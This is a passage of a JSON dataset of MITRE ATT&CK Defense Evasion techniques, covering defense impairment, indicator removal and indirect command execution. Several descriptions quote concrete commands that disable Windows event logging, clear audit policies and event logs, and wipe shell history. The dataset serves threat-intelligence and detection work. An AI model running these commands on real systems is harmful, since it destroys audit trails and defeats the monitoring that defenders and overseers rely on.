detection from security products since the execution can be masked under a legitimate process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:54.597371"
  },
  {
    "technique_id": "T1574.014",
    "name": "AppDomainManager",
    "description": "Adversaries may execute their own malicious payloads by hijacking how the .NETAppDomainManagerloads assemblies. The .NET framework uses theAppDomainManagerclass to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exeor.dllbinaries compiled to run as .NET code) may be loaded into an application domain as executable code.[1]Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.[2][3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:57.858331"
  },
  {
    "technique_id": "T1562",
    "name": "Impair Defenses",
    "description": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.[1][2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:01.116937",
    "subtechniques": [
      {
        "id": "T1562.001",
        "name": "Disable or Modify Tools"
      },
      {
        "id": "T1562.002",
        "name": "Disable Windows Event Logging"
      },
      {
        "id": "T1562.003",
        "name": "Impair Command History Logging"
      },
      {
        "id": "T1562.004",
        "name": "Disable or Modify System Firewall"
      },
      {
        "id": "T1562.006",
        "name": "Indicator Blocking"
      },
      {
        "id": "T1562.009",
        "name": "Safe Mode Boot"
      },
      {
        "id": "T1562.010",
        "name": "Downgrade Attack"
      },
      {
        "id": "T1562.011",
        "name": "Spoof Security Alerting"
      }
    ]
  },
  {
    "technique_id": "T1562.001",
    "name": "Disable or Modify Tools",
    "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.[1]Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar toIndicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.[2][3]Alternatively, they may add new directories to an endpoint detection and response (EDR) toolâ€™s exclusion list, enabling them to hide malicious files viaFile/Path Exclusions.[4][5]Adversaries may also focus on specific applications such as Sysmon. For example, the \"Start\" and \"Enable\" values inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operationalmay be modified to tamper with and potentially disable Sysmon logging.[6]On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.[7][8]In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.[9][10][11][12]For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.[11]Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e.Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.[13]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:04.575141"
  },
  {
    "technique_id": "T1562.002",
    "name": "Disable Windows Event Logging",
    "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.[1]This data is used by security tools and analysts to generate detections.The EventLog service maintains event logs from various system components and applications.[2]By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating toSecurity Settings\\Local Policies\\Audit Policyfor basic audit policy settings orSecurity Settings\\Advanced Audit Policy Configurationfor advanced audit policy settings.[3][4]auditpol.exemay also be used to set audit policies.[5]Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using theSet-Service -Name EventLog -Status Stoppedorsc config eventlog start=disabledcommands (followed by manually stopping the service usingStop-Service  -Name EventLog).[6][7]Additionally, the service may be disabled by modifying the \"Start\" value inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLogthen restarting the system for the change to take effect.[7]There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the keyHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security, then reboot the system to disable the Security EventLog.[8]Second, with Administrator privilege, adversaries may modify the same values inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-SystemandHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Applicationto disable the entire EventLog.[7]Additionally, adversaries may useauditpoland its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the/successor/failureparameters. For example,auditpol /set /category:\"Account Logon\" /success:disable /failure:disableturns off auditing for the Account Logon category.[9][10]To clear the audit policy, adversaries may run the following lines:auditpol /clear /yorauditpol /remove /allusers.[10]By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:07.939592"
  },
  {
    "technique_id": "T1562.003",
    "name": "Impair Command History Logging",
    "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, command history is tracked in a file pointed to by the environment variableHISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called~/.bash_history. TheHISTCONTROLenvironment variable keeps track of what should be saved by thehistorycommand and eventually into the~/.bash_historyfile when a user logs out.HISTCONTROLdoes not exist by default on macOS, but can be set by the user and will be respected. TheHISTFILEenvironment variable is also used in some ESXi systems.[1]Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally,HISTCONTROLcan be configured to ignore commands that start with a space by simply setting it to \"ignorespace\".HISTCONTROLcan also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \" ls\" will not be saved, but \"ls\" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.On Windows systems, thePSReadLinemodule tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtby default). Adversaries may change where these logs are saved usingSet-PSReadLineOption -HistorySavePath {File Path}. This will causeConsoleHost_history.txtto stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell commandSet-PSReadlineOption -HistorySaveStyle SaveNothing.[2][3][4]Adversaries may also leverage aNetwork Device CLIon network devices to disable historical command logging (e.g.no logging).",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:11.267318"
  },
  {
    "technique_id": "T1562.004",
    "name": "Disable or Modify System Firewall",
    "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e.Non-Standard Port).[1]Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.[2]Settings related to enabling abuse of variousRemote Servicesmay also indirectly modify firewall rules.In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., viaesxcli network firewall set) or via the vCenter user interface.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:14.666333"
  },
  {
    "technique_id": "T1562.006",
    "name": "Indicator Blocking",
    "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting[1]or even disabling host-based sensors, such as Event Tracing for Windows (ETW)[2], by tampering settings that control the collection and flow of event telemetry.[3]These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such asPowerShellorWindows Management Instrumentation.For example, adversaries may modify theFilevalue inHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Securityto hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.[4]ETW interruption can be achieved multiple ways, however most directly by defining conditions using thePowerShellSet-EtwTraceProvidercmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors.[5]ESXi also leverages syslog, which can be reconfigured via commands such asesxcli system syslog config setandesxcli system syslog config reload.[6][7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:18.024764"
  },
  {
    "technique_id": "T1562.009",
    "name": "Safe Mode Boot",
    "description": "Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.[1][2]Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.[3]Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e.Modify Registry). MaliciousComponent Object Model(COM) objects may also be registered and loaded in safe mode.[2][4][5][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:21.382538"
  },
  {
    "technique_id": "T1562.010",
    "name": "Downgrade Attack",
    "description": "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a systemâ€™s backward compatibility to force it into less secure modes of operation.Adversaries may downgrade and use various less-secure versions of features of a system, such asCommand and Scripting Interpreters or even network protocols that can be abused to enableAdversary-in-the-MiddleorNetwork Sniffing.[1]For example,PowerShellversions 5+ includes Script Block Logging (SBL), which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent toImpair Defenseswhile running malicious scripts that may have otherwise been detected.[2][3][4]Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.[5][6]On Windows systems, adversaries may downgrade the boot manager to a vulnerable version that bypasses Secure Boot, granting the ability to disable various operating system security mechanisms.[7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:24.758278"
  },
  {
    "technique_id": "T1562.011",
    "name": "Spoof Security Alerting",
    "description": "Adversaries may spoof security alerting from tools, presenting false evidence to impair defendersâ€™ awareness of malicious activity.[1]Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.Rather than or in addition toIndicator Blocking, an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g.,Disable or Modify Tools). An adversary can also present a \"healthy\" system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.For example, adversaries may show a fake Windows Security GUI and tray icon with a \"healthy\" system status after Windows Defender and other system tools have been disabled.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Impair Defenses",
    "parent_technique_id": "T1562",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:28.118656"
  },
  {
    "technique_id": "T1656",
    "name": "Impersonation",
    "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (viaPhishing for Information,Phishing, orInternal Spearphishing) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversaryâ€™s ultimate goals, possibly against multiple victims.In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enablesFinancial Theft.Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such aspayment,request, orurgentto push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversaryâ€™s goal.Impersonation is typically preceded by reconnaissance techniques such asGather Victim Identity InformationandGather Victim Org Informationas well as acquiring infrastructure such as email domains (i.e.Domains) to substantiate their false identity.[1]There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary mayCompromise Accountstargeting one organization which can then be used to support impersonation against other entities.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:31.393683",
    "subtechniques": []
  },
  {
    "technique_id": "T1070",
    "name": "Indicator Removal",
    "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversaryâ€™s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:34.677263",
    "subtechniques": [
      {
        "id": "T1070.001",
        "name": "Clear Windows Event Logs"
      },
      {
        "id": "T1070.003",
        "name": "Clear Command History"
      },
      {
        "id": "T1070.004",
        "name": "File Deletion"
      },
      {
        "id": "T1070.005",
        "name": "Network Share Connection Removal"
      },
      {
        "id": "T1070.006",
        "name": "Timestomp"
      },
      {
        "id": "T1070.007",
        "name": "Clear Network Connection History and Configurations"
      },
      {
        "id": "T1070.008",
        "name": "Clear Mailbox Data"
      },
      {
        "id": "T1070.009",
        "name": "Clear Persistence"
      },
      {
        "id": "T1070.010",
        "name": "Relocate Malware"
      }
    ]
  },
  {
    "technique_id": "T1070.001",
    "name": "Clear Windows Event Logs",
    "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.With administrator privileges, the event logs can be cleared with the following utility commands:wevtutil cl systemwevtutil cl applicationwevtutil cl securityThese logs may also be cleared through other mechanisms, such as the event viewer GUI orPowerShell. For example, adversaries may use the PowerShell commandRemove-EventLog -LogName Securityto delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.[1]Adversaries may also attempt to clear logs by directly deleting the stored log files withinC:\\Windows\\System32\\winevt\\logs\\.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:38.065492"
  },
  {
    "technique_id": "T1070.003",
    "name": "Clear Command History",
    "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variableHISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (history -c) or deleting the bash history filerm ~/.bash_history.Adversaries may also leverage aNetwork Device CLIon network devices to clear command history data (clear loggingand/orclear history).[1]On ESXi servers, command history may be manually removed from the/var/log/shell.logfile.[2]On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by thePSReadLinemodule. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.ThePSReadLinecommand history tracks the commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtby default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.[3]Adversaries may run the PowerShell commandClear-Historyto flush the entire command history from a current PowerShell session. This, however, will not delete/flush theConsoleHost_history.txtfile. Adversaries may also delete theConsoleHost_history.txtfile or edit its contents to hide PowerShell commands they have run.[4][5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:41.417181"
  },
  {
    "technique_id": "T1070.004",
    "name": "File Deletion",
    "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex:Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.[1]Examples of built-inCommand and Scripting Interpreterfunctions includedelon Windows,rmorunlinkon Linux and macOS, andrmon ESXi.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:44.943053"
  },
  {
    "technique_id": "T1070.005",
    "name": "Network Share Connection Removal",
    "description": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive andSMB/Windows Admin Sharesconnections can be removed when no longer needed.Netis an example utility that can be used to remove network share connections with thenet use \\system\\share /deletecommand.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:48.310607"
  },
  {
    "technique_id": "T1070.006",
    "name": "Timestomp",
    "description": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.In Windows systems, both the$STANDARD_INFORMATION($SI) and$FILE_NAME($FN) attributes record times in a Master File Table (MFT) file.[1]$SI(dates/time stamps) is displayed to the end user, including in the File System view, while$FNis dealt with by the kernel.[2]Modifying the$SIattribute is the most common method of timestomping because it can be modified at the user level using API calls.$FNtimestomping, however, typically requires interacting with the system kernel or moving or renaming a file.[1]Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the$SIand$FNattributes, adversaries may also engage in \"double timestomping\" by modifying times on both attributes simultaneously.[3]In Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such astouch -a -m -t <timestamp> <filename>(which sets access and modification times to a specific value) ortouch -r <filename> <filename>(which sets access and modification times to match those of another file).[4][5]Timestomping may be used along with file nameMasqueradingto hide malware and tools.[6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:51.723778"
  },
  {
    "technique_id": "T1070.007",
    "name": "Clear Network Connection History and Configurations",
    "description": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such asRemote ServicesorExternal Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under[1]:HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\DefaultHKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\ServersWindows may also store information about recent RDP connections in files such asC:\\Users\\%username%\\Documents\\Default.rdpandC:\\Users\\%username%\\AppData\\Local\\Microsoft\\TerminalServer Client\\Cache\\.[2]Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in/Library/Logsand/or/var/log/).[3][4][5]Malicious network connections may also require changes to third-party applications or network configuration settings, such asDisable or Modify System Firewallor tampering to enableProxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:55.060251"
  },
  {
    "technique_id": "T1070.008",
    "name": "Clear Mailbox Data",
    "description": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests.Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence ofPhishing/Internal Spearphishing,Email Collection,Mail Protocolsfor command and control, or email-based exfiltration such asExfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used theExchangePowerShellPowerShellmodule, includingRemove-MailboxExportRequestto remove evidence of mailbox exports.[1][2]On Linux and macOS, adversaries may also delete emails through a command line utility calledmailor useAppleScriptto interact with APIs on macOS.[3][4]Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:08:58.401590"
  },
  {
    "technique_id": "T1070.009",
    "name": "Clear Persistence",
    "description": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables,Modify Registry,Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.[1]Adversaries may also delete accounts previously created to maintain persistence (i.e.Create Account).[2]In some instances, artifacts of persistence may also be removed once an adversaryâ€™s persistence is executed in order to prevent errors with the new instance of the malware.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:01.773511"
  },
  {
    "technique_id": "T1070.010",
    "name": "Relocate Malware",
    "description": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined withFile Deletionto cleanup older artifacts.Relocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e.,Match Legitimate Resource Name or Location).[1]Payloads may also be repositioned to targetFile/Path Exclusionsas well as specific locations associated with establishingPersistence.[2]Relocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such asUser ExecutionandPhishing) that may have generated alerts or otherwise drawn attention from defenders.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Indicator Removal",
    "parent_technique_id": "T1070",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:05.121081"
  },
  {
    "technique_id": "T1202",
    "name": "Indirect Command Execution",
    "description": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invokingcmd. For example,Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL),Scriptrunner.exe, as well as other utilities may invoke the execution of programs and commands from aCommand and Scripting Interpreter, Run window, or via scripts.[1][2][3][4][5]Adversaries may also abuse thessh.exebinary to execute malicious commands via theProxyCommandandLocalCommandoptions, which can be invoked via the-oflag or by modifying the SSH config file.[6]Adversaries may abuse these features forDefense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage ofcmdor file extensions more commonly associated with malicious payloads.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:08.499546",
    "subtechniques": []
  },
  {
    "technique_id": "T1036",
    "name": "Masquerading",
